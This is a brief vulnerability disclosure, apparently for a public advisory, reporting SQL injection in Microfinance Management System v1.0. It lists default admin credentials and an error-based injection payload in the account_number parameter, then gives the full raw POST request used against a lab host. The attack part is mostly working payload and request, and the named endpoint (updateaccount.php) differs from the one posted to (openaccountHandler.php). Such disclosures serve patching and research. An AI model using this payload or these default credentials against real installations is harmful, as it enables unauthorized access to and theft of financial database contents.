# Microfinance management system v1.0 - SQL injection

### username:admin password:123456 ----> {ip}/login.php

Supplier:https://www.sourcecodester.com/php/14822/microfinance-management-system.html

/updateaccount.php has SQL injection

Payload:account_number=' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+

SQL injection because 'account_ number' parameter can be controlled

```
POST /cms001/app/openaccountHandler.php HTTP/1.1
Host: 192.168.0.196
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4476.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 163
Origin: http://192.168.0.196
Connection: close
Referer: http://192.168.0.196/cms001/updateaccount.php
Cookie: PHPSESSID=jl7s46ab2lmjcsjbb8ihlu3kq2
Upgrade-Insecure-Requests: 1

account_number=' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+=&customer=Select+one&account_type=Select+one&account_status=Select+one&update_account=
```

![image-20220325103340136](/Users/sqlmap/Library/Application Support/typora-user-images/image-20220325103340136.png)

![image-20220325103257871](/Users/sqlmap/Library/Application Support/typora-user-images/image-20220325103257871.png)

